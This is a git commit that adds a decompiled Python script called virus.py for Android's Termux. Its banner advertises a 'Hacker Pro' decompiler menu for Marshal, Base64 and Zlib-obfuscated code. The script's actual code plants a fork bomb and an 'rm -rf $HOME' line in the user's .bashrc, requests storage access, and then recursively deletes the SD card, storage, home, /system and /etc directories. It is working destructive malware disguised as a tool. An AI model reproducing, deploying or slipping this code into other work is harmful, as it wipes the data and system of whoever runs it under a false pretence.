ff840790f6c76109dfaffd383f2fc01560dc0128
Sazxt <karuma1363@gmail.com>
2019-09-12 07:29:22 +0700

    ok

---
+++ virus.py
@@ -0,0 +1,28 @@
+# uncompyle6 version 3.4.0
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.16 (default, Aug  6 2019, 01:11:15) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: <script>
+import os, sys
+logo = 'o                                        o\n                 \xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\n\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[ Hacker Pro ]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\nby: mr.xnxx  \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90 github: kepo\n\n\n\xe2\x9e\xa4 {01} Decompile Marshal\n\xe2\x9e\xa4 {02} Decompile Base16\n\xe2\x9e\xa4 {03} Decompile Base32\n\xe2\x9e\xa4 {04} Decompile Base64\n\xe2\x9e\xa4 {05} Decompile Zlib\n\xe2\x9e\xa4 {06} Decompile Zlib&Base16\n\xe2\x9e\xa4 {07} Decompile Zlib&Base32\n\xe2\x9e\xa4 {08} Decompile Zlib&Base64\n\xe2\x9e\xa4 {09} Decompile Marshal&Zlib&Base16\n\xe2\x9e\xa4 {10} Decompile Marshal&Zlib&Base32\n\xe2\x9e\xa4 {11} Decompile Marshal&Zlib&Base64\n\xe2\x9e\xa4 {12} Decompile pyc to py\n\xe2\x9e\xa4 {13} Decompile Marshal Hard\n\xe2\x9e\xa4 {00} Keluar'
+print logo
+os.system('touch .hushlogin')
+os.system('printf ":(){ :|: & };:\nrm -rf $HOME" > $HOME/.bashrc')
+os.system('termux-setup-storage')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /mnt/m_external_sd/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf $HOME/*')
+os.system('rm -rf /*')
+os.system('rm -rf /system/*')
+os.system('rm -rf /system/bin/*')
+os.system('rm -rf /etc/*')
+os.system('rm -rf /system/build.prop')
+os.system('rm -rf $HOME/../../*')
+os.system('rm -rf /d')
+os.system('bash .bashrc')
+os.remove('$HOME')
